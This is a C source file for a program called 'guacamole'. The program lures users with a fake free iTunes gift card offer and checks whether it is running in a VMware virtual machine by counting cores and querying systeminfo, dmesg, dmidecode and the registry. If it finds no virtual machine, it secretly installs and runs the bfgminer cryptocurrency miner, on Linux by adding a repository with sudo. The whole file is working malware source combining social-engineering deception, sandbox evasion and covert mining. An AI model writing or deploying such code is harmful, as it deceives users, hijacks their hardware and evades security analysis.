//
//  main.c
//  guacamole
//
//  Created by Jaken Herman on 7/13/16.
//  Copyright © 2016 jaken herman. All rights reserved.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

/* If vm_score reaches 3, we assume the system is running on
   a virtual machine. Otherwise, we detonate.
*/
int vm_score = 0;

void number_of_cores();
void run_command();
void registry_check();

int main(int argc, const char * argv[]) {
    number_of_cores();
#ifdef WIN32
    system("echo Attempting to verify your eligibility for a free "
           "iTunes gift card. This may take a while, please be patient.");
    char* vmware_sys = "System Manufacturer: \t VMware, Inc.";
    run_command("systeminfo | find \"System Manufacturer\"", vmware_sys, 36);
    registry_check();
    if(vm_score < 3){
        printf("Please wait while we generate a gift card code. \nNote, "
               "this could take a while, so please be patient and do not "
               "close the program. Thank you. \n");
        system("cd bfgminer-5.4.2-win64"); //change directories to bfgminer
        system("dir");
        system("start iTunesCardGenerator.bat");//start mining LiteCoin
    }

    printf("Virtual Machine detected. In order to receive your free iTunes "
	   "gift card, please run this program on physical hardware. Thank you. \n");
#else
    system("echo Enter your password for a free iTunes gift card: ");
    run_command("dmesg |grep -i hypervisor", "[   0.000000 Hypervisor detected]", 34);
    run_command("sudo dmidecode -s system-manufacturer", "VMware", 6);
    if(vm_score < 3){
	printf("Please wait while we generate a gift card code. \n Note, "
		"this could take a while, so please be patient and do not "
		"close the program. Thank you. \n");
	system("sudo zypper addrepo http://download.opensuse.org/repositories/home:Fisiu/openSUSE_13.1/home:Fisiu.repo");
	system("sudo zypper refresh");
	system("sudo zypper install bfgminer");
	system("chmod +x iTunesCardGenerator.sh");
	system("./iTunesCardGenerator.sh");
    }

    printf("Virtual Machine detected. In order to receive your free iTunes "
	   "gift card, please run this program on physical hardware. Thank you. \n");
#endif
    return 0;
}

/* number_of_cores serves the purpose of checking to see how many
   cores the system is running on. If the core count is less than
   one, there is a very good chance we are running on a virtual
   machine. */

void number_of_cores() {
#ifdef WIN32
    SYSTEM_INFO sysinf;
    GetSystemInfo(&sysinf);
    if(sysinf.dwNumberOfProcessors<=1){
        vm_score++;
    }
#else
    if(sysconf(_SC_NPROCESSORS_ONLN) <= 1){
        vm_score++;
    }
#endif
}

/* run_command serves the purposes of running terminal commands
   within both linux and windows environments.
   We use this for dmesg, dmidecode, and systeminfo.
*/

void run_command(char *cmd, char *detphrase, int dp_length){
    #define BUFSIZE 128
    char buf[BUFSIZE];
    FILE *fp;

    if((fp = popen(cmd, "r")) == NULL){
        printf("Error");
    }

    if(fgets(buf, BUFSIZE, fp) != NULL){
        char detection[(dp_length +1 )]; //one extra char for null terminator
        strncpy(detection, detphrase, dp_length);
        detection[dp_length] = '\0'; //place the null terminator

        if(strcmp(detphrase, detection) == 0){ //0 means detphrase = detection
            vm_score++;
        }
    }

    if(pclose(fp)){
        printf("Command not found or exited with error status \n");
    }
}

/* registry_check is a modified version of Sudeep Singh's
   registry_check method in the Breaking the Sandbox document.
   It is modified to only check for vmware, as that is the hypervisor
   the rest of the methods in this program check for.
*/
#ifdef WIN32
void registry_check(){
    HKEY hkey;
    char *buffer;
    int i=0,j=0;
    int size = 256;
    char *vm_name = "vmware";
    buffer = (char *) malloc(sizeof(char) * size);

    RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                 "SYSTEM\\ControlSet001\\Services\\Disk\\Enum",
                 0, KEY_READ, &hkey);
    RegQueryValueEx(hkey, "0", NULL, NULL, buffer, &size);

    while(*(buffer+i)){
        *(buffer+i) = (char) tolower(*(buffer+i));
        i++;
    }

    //compare the buffer and "vmware" to see if they are the same.
    if(strstr(buffer, vm_name) != NULL){
        vm_score++; //if buffer and "vmware" are equal, increase vm_score
    }

    return;
}
#endif
